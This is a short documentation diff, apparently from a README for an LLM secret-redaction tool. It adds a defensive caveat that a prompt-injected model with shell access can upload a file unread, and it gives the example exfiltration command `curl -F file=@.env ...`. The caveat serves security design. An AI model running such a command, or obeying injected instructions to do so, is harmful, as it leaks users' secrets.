@@ -382,6 +382,10 @@ for the architecture and options.
   current rules missed. It is ignored by Git and must be deleted after use.
 - Runtime redaction must be automatic. Do not rely on an LLM to redact its own
   inputs voluntarily.
+- Redaction protects the model context, not tool egress. A prompt-injected model
+  with shell or network access can upload a file without reading it
+  (`curl -F file=@.env ...`). Use network egress control, tool permissions and a
+  sandbox for that threat.
 
 ## Development
 
